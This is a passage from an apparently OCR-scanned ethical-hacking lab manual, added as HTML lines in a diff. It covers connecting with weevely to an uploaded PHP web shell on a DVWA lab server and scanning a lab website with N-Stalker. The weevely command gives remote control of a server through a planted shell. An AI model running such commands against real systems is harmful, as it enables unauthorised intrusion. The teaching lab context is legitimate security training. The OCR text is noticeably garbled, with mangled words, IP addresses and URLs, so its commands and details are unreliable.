+<br/>
+Switch back to the Terminal window, type weevely<br/>
+http://1 0.1 0.1 0.16:8080/dvwa/hackable/uploads/shell.php &lt;Password&gt;<br/>
+(Ibe password that you have provided in Step#S), and press Enter. This<br/>
+command establishes a connection with the payload and interacts with the<br/>
+target.<br/>
+<br/>
+Detect web application vulnerabilities using N-Stalker Web Application<br/>
+Security Scanner<br/>
+<br/>
+Here, we will perform website vulnerability scanning using N-Stalker Web<br/>
+Application Security Scanner.<br/>
+<br/>
+The N-5talker Scan Wizard appears. Under d1e Enter Web Application URL<br/>
+field, enter http://www.moviescope.com and under Choose Scan Policy<br/>
+field, select OWASP Policy from the drop-down list; click Next.<br/>
+<br/>
+The Optimize Settings wizard appears; leave the default setrings and click<br/>
+Next.<br/>
+<br/>
+Mter completing the configuration of N-Stalker, dick Start Scan from d1e<br/>
+menu bar to begirr scanning the MovieScope website.<br/>
+<br/>
+N-Stalker begins to scan the website. It goes through various steps such as<br/>
+Step 1 Spider, Step 2 Info Gather, Step 3 Run Modules, and Step 4 Sig<br/>
+Scanner, as shown in the screenshot.<br/>
+<br/>
+Ensure that the Save scan results radio button is selected under the Session<br/>
+Management Options section; and under the Next Steps section, select the<br/>
+Keep scan session for further analysis radio button and dick Next.<br/>
+<br/>
+In the left pane, expand all the nodes and sub-nodes of the URL<br/>
+http://www.moviescope.com/ under the Website Tree section. 'Ibis displays<br/>
+the website's p ages.<br/>
+<br/>
+Now, dick to expand the URL http://www.moviescioe.com/ under<br/>
+Vulnerabilities in the Scanner Events section to view all the site's<br/>
+vulnerabilities.<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
